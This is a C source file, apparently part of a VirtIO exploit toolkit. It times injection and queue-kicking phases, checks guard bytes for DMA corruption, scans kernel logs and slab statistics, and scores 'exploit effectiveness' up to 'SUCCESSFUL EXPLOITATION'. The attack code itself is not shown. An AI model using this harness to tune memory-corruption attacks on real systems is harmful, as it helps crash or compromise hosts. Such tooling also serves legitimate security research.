#ifdef DISABLE_FEEDBACK

#include "exploit_feedback.h"
#include <stdio.h>

void initialize_feedback_collection(void) { puts("[feedback] disabled"); }
void start_exploit_timing(void) {}
void record_injection_complete(void) {}
void record_kicking_complete(void) {}
void analyze_memory_corruption(void) {}
void analyze_device_behavior(void) {}
void calculate_effectiveness_score(void) {}
void print_exploit_feedback(void) {}
void save_feedback_log(const char *filename) { (void)filename; }

#else /* DISABLE_FEEDBACK not defined: full implementation */

#ifndef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#endif

#include "exploit_feedback.h"
#include "buffer_management.h" // For access to guard_region and abuse_buf

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>

static struct exploit_feedback feedback;
static struct timespec exploit_start_time;
static struct timespec injection_time;
static struct timespec kicking_time;

static double timespec_to_ms(const struct timespec *ts) {
    return (double)ts->tv_sec * 1000.0 + (double)ts->tv_nsec / 1000000.0;
}

static double time_diff_ms(const struct timespec *start, const struct timespec *end) {
    return timespec_to_ms(end) - timespec_to_ms(start);
}

static uint64_t get_memory_usage_kb(void) {
    FILE *meminfo = fopen("/proc/meminfo", "r");
    if (!meminfo) return 0;

    char line[256];
    uint64_t mem_total = 0, mem_available = 0;

    while (fgets(line, sizeof(line), meminfo)) {
        if (sscanf(line, "MemTotal: %lu kB", &mem_total) == 1) continue;
        if (sscanf(line, "MemAvailable: %lu kB", &mem_available) == 1) break;
    }

    fclose(meminfo);
    return mem_total - mem_available;
}

static int count_virtio_interrupts(void) {
    FILE *interrupts = fopen("/proc/interrupts", "r");
    if (!interrupts) return 0;

    char line[512];
    int total_interrupts = 0;

    while (fgets(line, sizeof(line), interrupts)) {
        if (strstr(line, "virtio")) {
            char *colon = strchr(line, ':');
            if (colon) {
                int count = 0;
                if (sscanf(colon + 1, "%d", &count) == 1) {
                    total_interrupts += count;
                }
            }
        }
    }

    fclose(interrupts);
    return total_interrupts;
}

static int verify_dma_corruption(void) {
    printf("\n=== VERIFYING DMA CORRUPTION VIA GUARD BYTES ===\n");
    
    if (!abuse_buf || !guard_region) {
        printf("No guard bytes available for verification\n");
        return 0;
    }

    int corruption_detected = 0;
    char *pre_canary = (char*)abuse_buf - 32;
    char *post_canary = (char*)abuse_buf + abuse_len;

    // Check pre-canary (should be all 0xAA)
    printf("Checking pre-canary at %p...\n", pre_canary);
    for (int i = 0; i < 32; i++) {
        if ((unsigned char)pre_canary[i] != 0xAA) {
            printf("  CORRUPTION: pre-canary[%d] = 0x%02x (expected 0xAA)\n", 
                   i, (unsigned char)pre_canary[i]);
            corruption_detected = 1;
        }
    }

    // Check post-canary (should be all 0xBB)
    printf("Checking post-canary at %p...\n", post_canary);
    for (int i = 0; i < 32; i++) {
        if ((unsigned char)post_canary[i] != 0xBB) {
            printf("  CORRUPTION: post-canary[%d] = 0x%02x (expected 0xBB)\n", 
                   i, (unsigned char)post_canary[i]);
            corruption_detected = 1;
        }
    }

    // Check for buffer overflows within the abuse buffer itself
    printf("Checking abuse buffer integrity...\n");
    int unexpected_changes = 0;
    unsigned char *buf = (unsigned char*)abuse_buf;
    for (size_t i = 0; i < abuse_len; i++) {
        if (buf[i] != 'B') {
            unexpected_changes++;
        }
    }

    if (unexpected_changes > 0) {
        printf("  BUFFER MODIFICATION: %d bytes changed from original 'B' pattern\n", 
               unexpected_changes);
        if (unexpected_changes > 1000) {
            printf("  SIGNIFICANT BUFFER CORRUPTION DETECTED!\n");
            corruption_detected = 1;
        }
    }

    if (corruption_detected) {
        printf("*** DMA CORRUPTION DETECTED VIA GUARD BYTES! ***\n");
        return 1;
    } else {
        printf("Guard bytes intact - no DMA corruption detected\n");
        return 0;
    }
}

void initialize_feedback_collection(void) {
    printf("\n=== INITIALIZING EXPLOIT FEEDBACK COLLECTION ===\n");
    memset(&feedback, 0, sizeof(feedback));
    feedback.pre_memory_usage = get_memory_usage_kb();

    printf("Baseline memory usage: %lu KB\n", feedback.pre_memory_usage);
    printf("Feedback collection initialized\n");
}

void start_exploit_timing(void) {
    clock_gettime(CLOCK_MONOTONIC, &exploit_start_time);
    printf("Exploit timing started\n");
}

void record_injection_complete(void) {
    clock_gettime(CLOCK_MONOTONIC, &injection_time);
    feedback.injection_time_ms = time_diff_ms(&exploit_start_time, &injection_time);
    printf("Injection completed in %.2f ms\n", feedback.injection_time_ms);
}

void record_kicking_complete(void) {
    clock_gettime(CLOCK_MONOTONIC, &kicking_time);
    feedback.kicking_time_ms = time_diff_ms(&injection_time, &kicking_time);
    feedback.total_exploit_time_ms = time_diff_ms(&exploit_start_time, &kicking_time);
    printf("Queue kicking completed in %.2f ms\n", feedback.kicking_time_ms);
    printf("Total exploit time: %.2f ms\n", feedback.total_exploit_time_ms);
}

void analyze_memory_corruption(void) {
    printf("\n=== ANALYZING MEMORY CORRUPTION ===\n");

    feedback.post_memory_usage = get_memory_usage_kb();
    long memory_change = (long)feedback.post_memory_usage - (long)feedback.pre_memory_usage;
    printf("Memory usage change: %+ld KB\n", memory_change);

    if (labs(memory_change) > 10240) {
        printf("SIGNIFICANT MEMORY USAGE CHANGE DETECTED!\n");
        feedback.memory_corruption_detected = 1;
    }

    // Check for DMA corruption via guard bytes
    int dma_corruption = verify_dma_corruption();
    if (dma_corruption) {
        feedback.memory_corruption_detected = 1;
    }

    FILE *dmesg = popen("dmesg | tail -50 | grep -i 'out of memory\\|allocation failed\\|memory corruption'", "r");
    if (dmesg) {
        char line[256];
        int corruption_lines = 0;

        while (fgets(line, sizeof(line), dmesg) && corruption_lines < 10) {
            printf("Memory corruption indicator: %s", line);
            feedback.memory_corruption_detected = 1;
            corruption_lines++;
        }
        pclose(dmesg);

        if (corruption_lines > 0) {
            printf("Found %d memory corruption indicators in kernel logs\n", corruption_lines);
        }
    }

    FILE *slabinfo = fopen("/proc/slabinfo", "r");
    if (slabinfo) {
        char line[256];
        int suspicious_slabs = 0;

        printf("Checking slab allocator for unusual patterns...\n");

        while (fgets(line, sizeof(line), slabinfo)) {
            if (strstr(line, "virtio") || strstr(line, "kmalloc")) {
                unsigned long active_objs, num_objs;
                if (sscanf(line, "%*s %lu %lu", &active_objs, &num_objs) == 2) {
                    if (active_objs > 10000 || num_objs > 50000) {
                        printf("Suspicious slab: %s", line);
                        suspicious_slabs++;
                    }
                }
            }
        }
        fclose(slabinfo);

        if (suspicious_slabs > 0) {
            printf("Found %d suspicious slab allocation patterns\n", suspicious_slabs);
            feedback.memory_fragmentation_change = suspicious_slabs;
        }
    }
}

void analyze_device_behavior(void) {
    printf("\n=== ANALYZING DEVICE BEHAVIOR ===\n");

    FILE *dmesg = popen("dmesg | tail -100 | grep -i 'virtio\\|device\\|i/o error\\|timeout'", "r");
    if (dmesg) {
        char line[256];
        int error_lines = 0;

        while (fgets(line, sizeof(line), dmesg) && error_lines < 20) {
            if (strstr(line, "error") || strstr(line, "timeout") ||
                strstr(line, "reset") || strstr(line, "failed")) {
                printf("Device error: %s", line);
                feedback.device_errors_detected++;
                error_lines++;
            }
        }
        pclose(dmesg);

        printf("Device errors detected: %d\n", feedback.device_errors_detected);
    }

    int current_interrupts = count_virtio_interrupts();
    printf("Current VirtIO interrupt count: %d\n", current_interrupts);

    FILE *warnings = popen("dmesg | tail -50 | grep -c 'WARNING\\|BUG\\|OOPS'", "r");
    if (warnings) {
        int warning_count = 0;
        if (fscanf(warnings, "%d", &warning_count) == 1) {
            feedback.kernel_warnings_generated = warning_count;
            printf("Kernel warnings generated: %d\n", warning_count);
        }
        pclose(warnings);
    }

    printf("Checking VirtIO device queue status...\n");
    system("find /sys/bus/virtio/devices -name '*' -exec ls -la {} \\; 2>/dev/null | head -10");
}

void calculate_effectiveness_score(void) {
    printf("\n=== CALCULATING EXPLOIT EFFECTIVENESS ===\n");

    int score = 0;

    if (feedback.total_exploit_time_ms < 100) score += 20;
    else if (feedback.total_exploit_time_ms < 1000) score += 15;
    else if (feedback.total_exploit_time_ms < 5000) score += 10;
    else score += 5;

    if (feedback.memory_corruption_detected) score += 25;
    if (feedback.memory_fragmentation_change > 0) score += 10;

    if (feedback.device_errors_detected > 0) score += 20;
    if (feedback.kernel_warnings_generated > 0) score += 15;

    if (feedback.descriptors_processed > 0) score += 10;

    feedback.effectiveness_score = score;

    printf("Exploit effectiveness score: %d/100\n", score);

    if (score >= 80) {
        printf("HIGHLY EFFECTIVE - Significant system impact detected\n");
    } else if (score >= 60) {
        printf("MODERATELY EFFECTIVE - Some system impact detected\n");
    } else if (score >= 40) {
        printf("PARTIALLY EFFECTIVE - Minor system impact detected\n");
    } else {
        printf("LOW EFFECTIVENESS - Minimal system impact detected\n");
    }
}

void print_exploit_feedback(void) {
    printf("\n" "=" "=" "=" " EXPLOIT FEEDBACK SUMMARY " "=" "=" "=" "\n");

    printf("Timing Analysis:\n");
    printf("  Injection time:    %.2f ms\n", feedback.injection_time_ms);
    printf("  Kicking time:      %.2f ms\n", feedback.kicking_time_ms);
    printf("  Total time:        %.2f ms\n", feedback.total_exploit_time_ms);

    printf("\nImpact Analysis:\n");
    printf("  Descriptors processed:        %d\n", feedback.descriptors_processed);
    printf("  Memory corruption detected:   %s\n", feedback.memory_corruption_detected ? "YES" : "NO");
    printf("  Device errors detected:       %d\n", feedback.device_errors_detected);
    printf("  Kernel warnings generated:    %d\n", feedback.kernel_warnings_generated);

    printf("\nMemory Analysis:\n");
    printf("  Pre-exploit usage:            %lu KB\n", feedback.pre_memory_usage);
    printf("  Post-exploit usage:           %lu KB\n", feedback.post_memory_usage);
    printf("  Memory change:                %+ld KB\n",
           (long)feedback.post_memory_usage - (long)feedback.pre_memory_usage);
    printf("  Fragmentation change:         %d\n", feedback.memory_fragmentation_change);

    printf("\nOverall Assessment:\n");
    printf("  Effectiveness Score:          %d/100\n", feedback.effectiveness_score);

    if (feedback.effectiveness_score >= 60) {
        printf("  Status:                       SUCCESSFUL EXPLOITATION\n");
    } else if (feedback.effectiveness_score >= 30) {
        printf("  Status:                       PARTIAL EXPLOITATION\n");
    } else {
        printf("  Status:                       EXPLOITATION FAILED\n");
    }

    printf("=" "=" "=" "=" "=" "=" "=" "=" "=" "=" "=" "=" "=" "=" "=" "\n");
}

void save_feedback_log(const char *filename) {
    printf("\nSaving exploit feedback to %s\n", filename);

    FILE *log_file = fopen(filename, "w");
    if (!log_file) {
        printf("Failed to create feedback log: %s\n", strerror(errno));
        return;
    }

    time_t now = time(NULL);
    fprintf(log_file, "VirtIO Exploit Feedback Log\n");
    fprintf(log_file, "===========================\n");
    fprintf(log_file, "Timestamp: %s\n", ctime(&now));

    fprintf(log_file, "\nTiming Analysis:\n");
    fprintf(log_file, "Injection time: %.2f ms\n", feedback.injection_time_ms);
    fprintf(log_file, "Kicking time: %.2f ms\n", feedback.kicking_time_ms);
    fprintf(log_file, "Total time: %.2f ms\n", feedback.total_exploit_time_ms);

    fprintf(log_file, "\nImpact Analysis:\n");
    fprintf(log_file, "Descriptors processed: %d\n", feedback.descriptors_processed);
    fprintf(log_file, "Memory corruption detected: %s\n", feedback.memory_corruption_detected ? "YES" : "NO");
    fprintf(log_file, "Device errors detected: %d\n", feedback.device_errors_detected);
    fprintf(log_file, "Kernel warnings generated: %d\n", feedback.kernel_warnings_generated);

    fprintf(log_file, "\nMemory Analysis:\n");
    fprintf(log_file, "Pre-exploit usage: %lu KB\n", feedback.pre_memory_usage);
    fprintf(log_file, "Post-exploit usage: %lu KB\n", feedback.post_memory_usage);
    fprintf(log_file, "Memory change: %+ld KB\n",
            (long)feedback.post_memory_usage - (long)feedback.pre_memory_usage);
    fprintf(log_file, "Fragmentation change: %d\n", feedback.memory_fragmentation_change);

    fprintf(log_file, "\nOverall Assessment:\n");
    fprintf(log_file, "Effectiveness Score: %d/100\n", feedback.effectiveness_score);

    fclose(log_file);
    printf("Feedback log saved successfully\n");
}

#endif /* DISABLE_FEEDBACK */
